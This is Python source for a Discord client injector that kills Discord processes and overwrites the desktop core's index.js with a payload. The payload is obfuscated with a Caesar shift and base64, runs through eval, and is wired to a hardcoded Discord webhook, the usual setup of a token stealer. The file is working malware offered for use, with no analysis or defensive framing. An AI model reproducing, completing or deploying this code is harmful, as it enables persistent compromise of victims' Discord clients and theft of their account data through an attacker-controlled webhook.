import os
import random
import re
from base64 import b64encode

import psutil as psutil

appData = os.getenv("localappdata")
webhook = "https://discord.com/api/webhooks/1148402961844809738/J4Fiq6OAg" \
          "-t5dVeKHv_FxLhh05qt2Llg7QXRBUQlKQpso4KJsmw5jqjto7PbvLLeVrz_"

base = """function decrypt(chain) {
    let script = chain
    let buff = Buffer.from(script, 'base64');
    let step1 = buff.toString('utf-8');
    var key = step1.slice(-2);
    var txt = step1.slice(0, -2);
    var gap = key.split('').reduce(function(acc, val) {
        return acc + val.charCodeAt(0);
    }, 0) % 26
    var src = "";
    for (var i = 0; i < txt.length; i++) {
        var c = txt[i];
        if (c.match(/[a-z]/i)) {
            var c_int = "";
            if (c === c.toLowerCase()) {
                c_int = String.fromCharCode((c.charCodeAt(0) - 97 - gap + 26) % 26 + 97);
            } else {
                c_int = String.fromCharCode((c.charCodeAt(0) - 65 - gap + 26) % 26 + 65);
            }
            src += c_int;
        } else {
            src += c;
        }
    }
    return src
}
eval(decrypt("%SCRIPT%"))
module.exports = require('./core.asar');"""


def hideJS(scr1pt):
    # set the alphabet
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    # set the caesar key
    k3y = ''.join(random.sample(alpha, 2))
    g4p = sum(ord(c) for c in k3y) % 26
    c43s4r = ''
    for c in scr1pt:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 + g4p) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 + g4p) % 26 + 65)
        else:
            c_int = c
        c43s4r += c_int
    o8f_st1 = str(c43s4r + k3y)
    byt3 = o8f_st1.encode('UTF-8')
    t3xt = b64encode(byt3)
    jskr4mkr4m = base.replace('%SCRIPT%', t3xt.decode('UTF-8'))
    return jskr4mkr4m


class Injection:
    def __init__(self):
        self.discords = [
            f"{appData}\\Discord"
        ]

        self.code = open("inject.js", "r", encoding="utf-8").read()

        for proc in psutil.process_iter():
            if "discord" in proc.name().lower():
                proc.kill()

        for d in self.discords:
            if not os.path.exists(d):
                continue

            if self.getCore(d) is not None:
                print(f"Infecting {d}")
                with open(f"{self.getCore(d)[0]}\\index.js", "w", encoding="utf-8") as f:
                    f.write(hideJS(
                        self.code
                        .replace("%WEBHOOK%", webhook)
                    ))


    @staticmethod
    def getCore(d: str) -> tuple:
        for f in os.listdir(d):
            if re.search(r'app-+?', f):
                modules = d + '\\' + f + '\\modules'
                if not os.path.exists(modules):
                    continue

                for f in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', f):
                        core = modules + '\\' + f + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, f


if __name__ == "__main__":
    i = Injection()
